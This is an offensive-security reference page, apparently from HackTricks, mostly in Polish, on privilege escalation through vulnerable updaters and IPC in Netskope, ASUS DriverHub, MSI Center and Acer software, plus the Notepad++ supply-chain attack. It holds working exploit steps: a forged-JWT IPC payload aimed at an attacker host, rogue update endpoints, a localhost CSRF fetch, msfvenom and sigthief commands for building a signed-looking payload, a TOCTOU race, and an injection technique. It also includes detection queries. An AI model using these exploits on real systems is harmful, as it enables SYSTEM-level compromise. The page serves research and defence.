# Wykorzystywanie korporacyjnych auto-updaterów i uprzywilejowanego IPC (np. Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Ta strona uogólnia klasę łańcuchów eskalacji uprawnień lokalnych w Windows znalezionych w agentach endpoint i updaterach korporacyjnych, które udostępniają niskotarciową powierzchnię IPC i uprzywilejowany przepływ aktualizacji. Przykładem jest Netskope Client for Windows < R129 (CVE-2025-0309), gdzie użytkownik o niskich uprawnieniach może wymusić rejestrację do serwera kontrolowanego przez atakującego, a następnie dostarczyć złośliwy MSI, który instaluje usługa SYSTEM.

Kluczowe pomysły, które można zastosować wobec podobnych produktów:
- Wykorzystaj localhost IPC uprzywilejowanej usługi, by wymusić ponowną rejestrację lub rekonfigurację do serwera atakującego.
- Zaimplementuj endpointy aktualizacji dostawcy, dostarcz złośliwy Trusted Root CA i skieruj updater na złośliwy, „podpisany” pakiet.
- Obejdź słabe weryfikacje podpisującego (CN allow-lists), opcjonalne flagi skrótu oraz luźne właściwości MSI.
- Jeśli IPC jest „zaszyfrowane”, wyprowadź klucz/IV z powszechnie czytelnych identyfikatorów maszyny przechowywanych w rejestrze.
- Jeżeli usługa ogranicza wywołujących według image path/process name, wstrzyknij kod do procesu z listy dozwolonej lub utwórz proces w stanie zawieszenia i uruchom swój DLL przez minimalną modyfikację kontekstu wątku.

---
## 1) Wymuszanie rejestracji do serwera atakującego przez localhost IPC

Wiele agentów zawiera proces UI w trybie użytkownika, który komunikuje się z usługą SYSTEM przez localhost TCP używając JSON.

Zaobserwowane w Netskope:
- UI: stAgentUI (niska integralność) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Przebieg exploitu:
1) Sporządź token JWT enrollment, którego claims kontrolują host backendu (np. AddonUrl). Użyj alg=None, więc podpis nie jest wymagany.
2) Wyślij wiadomość IPC wywołującą komendę provisioning z twoim JWT i nazwą tenanta:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Usługa zaczyna kierować żądania do twojego złośliwego serwera w celu rejestracji/konfiguracji, np.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes:
- Jeśli weryfikacja wywołującego opiera się na ścieżce/nazwie, zainicjuj żądanie z binarki dostawcy znajdującej się na liście dozwolonych (see §4).

---
## 2) Przejęcie kanału aktualizacji w celu uruchomienia kodu jako SYSTEM

Gdy klient połączy się z twoim serwerem, zaimplementuj oczekiwane endpointy i skieruj go do złośliwego MSI. Typowa sekwencja:

1) /v2/config/org/clientconfig → Return JSON config with a very short updater interval, e.g.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Zwraca certyfikat CA w formacie PEM. Usługa instaluje go do Local Machine Trusted Root store.
3) /v2/checkupdate → Dostarcza metadane wskazujące na złośliwy MSI i fałszywą wersję.

Bypassing common checks seen in the wild:
- Signer CN allow-list: usługa może jedynie sprawdzać, czy Subject CN równa się „netSkope Inc” lub „Netskope, Inc.”. Rogue CA może wystawić certyfikat końcowy z tym CN i podpisać MSI.
- CERT_DIGEST property: dołącz neutralną właściwość MSI o nazwie CERT_DIGEST. Podczas instalacji nie jest ona egzekwowana.
- Optional digest enforcement: flaga konfiguracyjna (np. check_msi_digest=false) wyłącza dodatkową weryfikację kryptograficzną.

Wynik: usługa SYSTEM instaluje twój MSI z
C:\ProgramData\Netskope\stAgent\data\*.msi
wykonując dowolny kod jako NT AUTHORITY\SYSTEM.

---
## 3) Forging encrypted IPC requests (when present)

From R127, Netskope wrapped IPC JSON in an encryptData field that looks like Base64. Reversing showed AES with key/IV derived from registry values readable by any user:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Attackers can reproduce encryption and send valid encrypted commands from a standard user. General tip: if an agent suddenly “encrypts” its IPC, look for device IDs, product GUIDs, install IDs under HKLM as material.

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

Some services try to authenticate the peer by resolving the TCP connection’s PID and comparing the image path/name against allow-listed vendor binaries located under Program Files (e.g., stagentui.exe, bwansvc.exe, epdlp.exe).

Two practical bypasses:
- DLL injection into an allow-listed process (e.g., nsdiag.exe) and proxy IPC from inside it.
- Spawn an allow-listed binary suspended and bootstrap your proxy DLL without CreateRemoteThread (see §5) to satisfy driver-enforced tamper rules.

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

Products often ship a minifilter/OB callbacks driver (e.g., Stadrv) to strip dangerous rights from handles to protected processes:
- Process: removes PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: restricts to THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

A reliable user-mode loader that respects these constraints:
1) CreateProcess of a vendor binary with CREATE_SUSPENDED.
2) Obtain handles you’re still allowed to: PROCESS_VM_WRITE | PROCESS_VM_OPERATION on the process, and a thread handle with THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (or just THREAD_RESUME if you patch code at a known RIP).
3) Overwrite ntdll!NtContinue (or other early, guaranteed-mapped thunk) with a tiny stub that calls LoadLibraryW on your DLL path, then jumps back.
4) ResumeThread to trigger your stub in-process, loading your DLL.

Because you never used PROCESS_CREATE_THREAD or PROCESS_SUSPEND_RESUME on an already-protected process (you created it), the driver’s policy is satisfied.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) automates a rogue CA, malicious MSI signing, and serves the needed endpoints: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope is a custom IPC client that crafts arbitrary (optionally AES-encrypted) IPC messages and includes the suspended-process injection to originate from an allow-listed binary.

---
## 1) Browser-to-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub ships a user-mode HTTP service (ADU.exe) on 127.0.0.1:53000 that expects browser calls coming from https://driverhub.asus.com. The origin filter simply performs `string_contains(".asus.com")` over the Origin header and over download URLs exposed by `/asus/v1.0/*`. Any attacker-controlled host such as `https://driverhub.asus.com.attacker.tld` therefore passes the check and can issue state-changing requests from JavaScript. See [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) for additional bypass patterns.

Practical flow:
1) Register a domain that embeds `.asus.com` and host a malicious webpage there.
2) Use `fetch` or XHR to call a privileged endpoint (e.g., `Reboot`, `UpdateApp`) on `http://127.0.0.1:53000`.
3) Send the JSON body expected by the handler – the packed frontend JS shows the schema below.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Nawet PowerShell CLI pokazany poniżej zadziała, gdy Origin header zostanie spoofed do zaufanej wartości:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Każda wizyta przeglądarki na stronie atakującego staje się więc lokalnym CSRF wymagającym 1 kliknięcia (lub 0 kliknięć przez `onload`), które uruchamia helpera działającego jako SYSTEM.

---
## 2) Insecure code-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` pobiera dowolne pliki wykonywalne zdefiniowane w ciele JSON i buforuje je w `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Walidacja URL pobierania ponownie używa tej samej logiki substring, więc `http://updates.asus.com.attacker.tld:8000/payload.exe` jest akceptowany. Po pobraniu ADU.exe jedynie sprawdza, czy PE zawiera podpis i czy pole Subject odpowiada ASUS przed uruchomieniem – brak `WinVerifyTrust`, brak walidacji łańcucha.

Aby uzbroić ten przepływ:
1) Utwórz payload (np. `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Sklonuj podpis ASUS do niego (np. `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Hostuj `pwn.exe` na domenie udającej `.asus.com` i wyzwól UpdateApp przez opisany powyżej CSRF w przeglądarce.

Ponieważ zarówno filtry Origin jak i URL są oparte na substringach, a sprawdzenie podpisującego porównuje tylko stringi, DriverHub pobiera i wykonuje binarkę atakującego w kontekście podwyższonym.

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

Usługa SYSTEM MSI Center udostępnia protokół TCP, gdzie każda ramka to `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Główny komponent (Component ID `0f 27 00 00`) dostarcza `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Jego handler:
1) Kopiuje dostarczony plik wykonywalny do `C:\Windows\Temp\MSI Center SDK.exe`.
2) Weryfikuje podpis przez `CS_CommonAPI.EX_CA::Verify` (pole Subject certyfikatu musi równać się “MICRO-STAR INTERNATIONAL CO., LTD.” i `WinVerifyTrust` musi zakończyć się sukcesem).
3) Tworzy zadanie harmonogramu, które uruchamia plik tymczasowy jako SYSTEM z argumentami kontrolowanymi przez atakującego.

Skopiowany plik nie jest zablokowany między weryfikacją a `ExecuteTask()`. Atakujący może:
- Wysłać Frame A wskazujący na legalny binarny plik podpisany przez MSI (gwarantuje, że weryfikacja podpisu przejdzie i zadanie zostanie zqueue'owane).
- Rywacować to powtarzanymi Frame B, które wskazują na złośliwy payload, nadpisując `MSI Center SDK.exe` tuż po zakończeniu weryfikacji.

Gdy scheduler się uruchomi, wykona nadpisany payload jako SYSTEM mimo że pierwotny plik został zweryfikowany. Niezawodne wykorzystanie polega na dwóch goroutines/threads spamujących CMD_AutoUpdateSDK aż okno TOCTOU zostanie wygrane.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Każdy plugin/DLL ładowany przez `MSI.CentralServer.exe` otrzymuje Component ID przechowywane pod `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Pierwsze 4 bajty ramki wybierają ten komponent, pozwalając atakującym kierować komendy do dowolnych modułów.
- Pluginy mogą definiować własne task runnery. `Support\API_Support.dll` udostępnia `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` i bezpośrednio wywołuje `API_Support.EX_Task::ExecuteTask()` z **brak weryfikacji podpisu** – każdy lokalny użytkownik może wskazać na `C:\Users\<user>\Desktop\payload.exe` i deterministycznie uzyskać wykonanie jako SYSTEM.
- Podsłuchiwanie loopbacku z Wireshark lub instrumentacja binarek .NET w dnSpy szybko ujawnia mapowanie Component ↔ command; niestandardowe klieny Go/Python mogą potem odtwarzać ramki.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) udostępnia `\\.\pipe\treadstone_service_LightMode`, a jego discretionary ACL pozwala zdalnym klientom (np. `\\TARGET\pipe\treadstone_service_LightMode`). Wysłanie command ID `7` z ścieżką pliku wywołuje routine spawnującą proces w serwisie.
- Biblioteka kliencka serializuje magiczny bajt terminatora (113) wraz z argumentami. Dynamiczna instrumentacja z Frida/`TsDotNetLib` (see [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) for instrumentation tips) pokazuje, że natywny handler mapuje tę wartość na `SECURITY_IMPERSONATION_LEVEL` i integrity SID przed wywołaniem `CreateProcessAsUser`.
- Zamiana 113 (`0x71`) na 114 (`0x72`) wchodzi w ogólną gałąź, która zachowuje pełny token SYSTEM i ustawia wysokointregitywny SID (`S-1-16-12288`). Wskazana binarka uruchomiona jest więc jako nieograniczony SYSTEM, zarówno lokalnie jak i między maszynami.
- Połącz to z wystawionym flagiem instalatora (`Setup.exe -nocheck`), aby postawić ACC nawet na VM testowych i ćwiczyć pipe bez sprzętu producenta.

Te błędy IPC pokazują, dlaczego usługi localhost muszą wymuszać wzajemną autentykację (ALPC SIDs, `ImpersonationLevel=Impersonation` filtry, token filtering) i dlaczego helper każdego modułu „uruchom dowolny binarny” musi stosować te same weryfikacje podpisującego.

---
## Remote supply-chain hijack via weak updater validation (WinGUp / Notepad++)

Starsze updatery Notepad++ oparte na WinGUp nie weryfikowały w pełni autentyczności aktualizacji. Gdy atakujący przejęli dostawcę hostingu serwera aktualizacji, mogli manipulować manifestem XML i kierować tylko wybranych klientów na URL-e atakującego. Ponieważ klient akceptował dowolną odpowiedź HTTPS bez wymuszenia zarówno zaufanego łańcucha certyfikatów, jak i ważnego podpisu PE, ofiary pobierały i wykonywały trojanizowany NSIS `update.exe`.

Przebieg operacji (lokalny exploit nie jest wymagany):
1. **Infrastructure interception**: compromise CDN/hosting and answer update checks with attacker metadata pointing at a malicious download URL.
2. **Trojanized NSIS**: instalator pobiera/wykonuje payload i nadużywa dwóch łańcuchów wykonania:
- **Bring-your-own signed binary + sideload**: dołączony jest podpisany Bitdefender `BluetoothService.exe` i upuszczany jest złośliwy `log.dll` w jego ścieżce wyszukiwania. Gdy podpisany binarny plik się uruchomi, Windows sideladuje `log.dll`, która odszyfrowuje i reflectively ładuje backdoor Chrysalis (Warbird-protected + API hashing, aby utrudnić wykrywanie statyczne).
- **Scripted shellcode injection**: NSIS uruchamia skompilowany skrypt Lua, który używa Win32 API (np. `EnumWindowStationsW`) do wstrzyknięcia shellcode i etapowania Cobalt Strike Beacon.

Hardening/detection takeaways for any auto-updater:
- Wymuszaj **certificate + signature verification** pobranego instalatora (pinuj podpisującego dostawcę, odrzucaj niezgodne CN/chain) i podpisz sam manifest aktualizacji (np. XMLDSig). Blokuj przekierowania kontrolowane przez manifest chyba że są zweryfikowane.
- Traktuj **BYO signed binary sideloading** jako punkt detekcji po ściągnięciu: alertuj, gdy podpisany EXE dostawcy ładuje nazwę DLL spoza jego kanonicznej ścieżki instalacyjnej (np. Bitdefender ładujący `log.dll` z Temp/Downloads) oraz gdy updater upuszcza/wykonuje instalatory z temp z podpisami nie-dostawcy.
- Monitoruj **artefakty specyficzne dla malware** obserwowane w tym łańcuchu (użyteczne jako ogólne pivoty): mutex `Global\Jdhfv_1.0.1`, anomalne zapisy `gup.exe` do `%TEMP%`, oraz etapy wstrzykiwania shellcode sterowane Lua.

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> uruchamianie instalatora innego niż Notepad++</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Te wzorce można uogólnić na każdy updater, który akceptuje unsigned manifests lub nie przypina signerów instalatora — network hijack + malicious installer + BYO-signed sideloading prowadzi do remote code execution pod przykrywką “trusted” updates.

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)

{{#include ../../banners/hacktricks-training.md}}
